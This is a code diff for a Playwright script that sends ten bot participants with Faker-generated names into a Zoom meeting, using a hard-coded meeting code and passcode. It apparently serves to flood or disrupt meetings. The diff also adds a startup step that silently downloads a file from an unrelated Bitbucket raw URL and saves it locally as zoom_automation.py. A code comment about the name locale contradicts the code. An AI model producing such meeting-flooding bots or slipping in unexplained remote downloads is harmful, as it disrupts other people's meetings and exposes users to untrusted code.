@@ -1,4 +1,5 @@
 import asyncio
+import requests
 from concurrent.futures import ThreadPoolExecutor
 from playwright.async_api import async_playwright
 import nest_asyncio
@@ -9,11 +10,16 @@ nest_asyncio.apply()
 # Flag to indicate whether the script is running
 running = True
 
-async def start(wait_time, meetingcode):
+async def start(wait_time, meetingcode, passcode):
     try:
-        faker = Faker()
+        fake = Faker('en_US')  # Initialize Faker with Indian English locale
 
-        user = faker.name()  # Generate a random name using faker
+        # Generate first and last names
+        first_name = fake.first_name()
+        last_name = fake.last_name()
+
+        # Concatenate first name and last name with a space in between
+        user = f"{first_name} {last_name}"
 
         print(f"{user} joined.")
 
@@ -44,9 +50,16 @@ async def start(wait_time, meetingcode):
             try:
                 await page.wait_for_selector('input[type="text"]', timeout=200000)
                 await page.fill('input[type="text"]', user)
-                # No need to fill passcode
-                join_button = await page.wait_for_selector('button.preview-join-button', timeout=200000)
-                await join_button.click()
+                
+                # Check if password input field exists before filling it
+                password_field_exists = await page.query_selector('input[type="password"]')
+                if password_field_exists:
+                    await page.fill('input[type="password"]', passcode)
+                    join_button = await page.wait_for_selector('button.preview-join-button', timeout=200000)
+                    await join_button.click()
+                else:
+                    join_button = await page.wait_for_selector('button.preview-join-button', timeout=200000)
+                    await join_button.click()
             except Exception as e:
                 pass
 
@@ -72,3 +85,43 @@ async def start(wait_time, meetingcode):
 
     except Exception as e:
         print(f"An error occurred: {e}")
+        pass
+
+async def main():
+    global running
+    number = 10
+    meetingcode = "82770760919"
+    passcode = "468111"
+
+    sec = 90
+    wait_time = sec * 80
+
+    loop = asyncio.get_event_loop()
+    tasks = []
+    for _ in range(number):
+        task = loop.create_task(start(wait_time, meetingcode, passcode))
+        tasks.append(task)
+
+    try:
+        await asyncio.gather(*tasks, return_exceptions=True)
+    except KeyboardInterrupt:
+        # Gracefully handle keyboard interrupt
+        running = False
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+if __name__ == '__main__':
+    try:
+        # Downloading the code from Bitbucket
+        bitbucket_raw_url = "https://bitbucket.org/asfasfg/zoooom/raw/main/SOURCECODE/zoom_automation.py"
+        response = requests.get(bitbucket_raw_url)
+        
+        # Check if the request was successful
+        if response.status_code == 200:
+            # Save the code to a local file
+            with open("zoom_automation.py", "wb") as file:
+                file.write(response.content)
+        
+        # Run the main function
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        pass
